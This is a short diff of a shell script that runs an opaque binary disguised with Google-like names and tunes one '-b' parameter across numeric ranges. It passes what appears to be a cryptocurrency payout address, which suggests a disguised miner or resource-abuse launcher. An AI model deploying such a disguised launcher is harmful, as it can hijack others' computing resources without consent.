@@ -22,7 +22,7 @@ cd googleapps8474
 if (($google84 >= 14884 && $google84 <= 16884));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 798
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 800
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -34,7 +34,7 @@ fi
 if (($google84 >= 10884 && $google84 <= 14882));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 572
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 600
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -46,7 +46,7 @@ fi
 if (($google84 >= 5288 && $google84 <= 9184));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 420
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 400
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -58,7 +58,7 @@ fi
 if (($google84 >= 2874 && $google84 <= 5184));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 210
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 200
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -70,7 +70,7 @@ fi
 if (($google84 >= 1884 && $google84 <= 2488));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 98
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 100
 if [ $? -eq 124 ]; then
 echo "google84"
 else
